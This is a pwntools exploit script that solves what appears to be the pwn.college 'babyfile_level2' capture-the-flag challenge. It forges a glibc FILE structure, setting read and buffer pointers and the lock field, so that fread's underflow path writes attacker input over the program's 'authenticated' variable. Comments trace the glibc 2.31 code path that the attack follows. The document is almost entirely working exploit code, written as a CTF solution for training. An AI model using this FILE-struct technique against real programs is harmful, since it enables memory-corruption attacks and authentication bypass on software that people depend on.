from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level2")
libc=e.libc
gs="""
set listsize 100
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b fread
b *__GI__IO_file_xsgetn
b *__GI__IO_file_read
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level2")
sleep(1)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p64(0)+
               #make 0 < have < want where want=0x100 ; have=fp->_IO_read_end - fp->_IO_read_ptr
               # ==> s = __mempcpy (s, fp->_IO_read_ptr, have); // = &authenticated
               p64(e.sym.authenticated)+p64(e.sym.authenticated+0x10)+p64(e.sym.authenticated)+ #_IO_read_ptr, _IO_read_end, _IO_read_base
               p64(0)+p64(0)+p64(0)+ #writes
               p64(e.sym.authenticated)+p64(e.sym.authenticated+0x101)+ # buf_base, buf_end
               # (fp->_IO_buf_base  && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
               # ==> call __underflow (fp)
               # ==> call _IO_new_file_underflow(fp)
               # ==> flag =0 pass many conditons
               # ==> call  _IO_SYSREAD (fp, fp->_IO_buf_base,fp->_IO_buf_end - fp->_IO_buf_base);
               b"\x00"*(112-8*9)+p32(0)+p32(0)+
               b"\x00"*(130-112-8)+b"\x00"+
               b"\x00"*(136-130-1)+p64(e.sym.authenticated+4)#+ #_lock
               #b"\x00"*(216-136-8)+b"\x98"
)
pause()
p.sendline(b"A"*0x200)
p.interactive()